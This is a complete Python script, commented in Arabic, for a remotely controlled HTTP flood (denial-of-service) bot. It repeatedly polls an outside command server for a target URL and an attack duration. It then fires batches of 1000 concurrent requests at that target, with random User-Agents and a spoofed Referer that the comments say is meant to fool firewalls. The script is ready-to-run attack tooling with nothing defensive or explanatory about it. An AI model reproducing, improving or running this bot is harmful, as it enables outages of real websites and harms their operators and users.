import asyncio
import aiohttp
import time
import xml.etree.ElementTree as ET
from fake_useragent import UserAgent

# أقصى عدد من الطلبات المتزامنة
concurrent_requests = 1000  

# رابط API الذي يوفر الإعدادات
api_url = 'http://nrcf.medianewsonline.com/api/index.php'

# إنشاء كائن UserAgent لتوليد وكلاء مزيفين
ua = UserAgent()

async def get_instructions():
    """جلب إعدادات الهجوم من API خارجي"""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                if response.status == 200:
                    xml_data = await response.text()
                    if xml_data:
                        try:
                            root = ET.fromstring(xml_data)
                            url = root.find('url').text
                            time_limit = int(root.find('time').text)
                            return url, time_limit
                        except ET.ParseError:
                            return None, None
                return None, None
    except Exception:
        return None, None

async def send_request(session, request_number, semaphore, url):
    """إرسال طلب HTTP"""
    async with semaphore:  # التحكم في عدد الطلبات المتزامنة
        try:
            headers = {
                "User-Agent": ua.random,  # توليد User-Agent عشوائي لكل طلب
                "Accept": "/",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Referer": url,  # خداع بعض الجدران النارية
            }
            async with session.get(url, headers=headers, timeout=10) as response:
                await response.text()
                print(f"الطلب {request_number}: حالة الاستجابة {response.status}")
        except Exception as e:
            print(f"خطأ في الطلب {request_number}: {e}")

async def send_requests_in_batch(url, duration):
    """تنفيذ الطلبات وفقًا للإعدادات المستلمة"""
    start_time = time.time()
    semaphore = asyncio.Semaphore(concurrent_requests)  # التحكم في الطلبات المتزامنة
    connector = aiohttp.TCPConnector(limit=0, ssl=False)

    async with aiohttp.ClientSession(connector=connector) as session:
        request_number = 1
        while time.time() - start_time < duration:
            tasks = [send_request(session, request_number + i, semaphore, url) for i in range(concurrent_requests)]
            await asyncio.gather(*tasks)
            request_number += concurrent_requests

async def main():
    """الحلقة الرئيسية التي تتحقق من API وتنفذ الهجوم عند توفر الإعدادات"""
    while True:
        url, duration = await get_instructions()

        if url and duration:
            print(f"بدء الهجوم على {url} لمدة {duration} ثانية...")
            await send_requests_in_batch(url, duration)
            print(f"تم إيقاف الإرسال بعد {duration} ثانية.")
        else:
            print("لم يتم العثور على إعدادات صحيحة، إعادة المحاولة بعد 10 ثوانٍ...")
            await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(main())
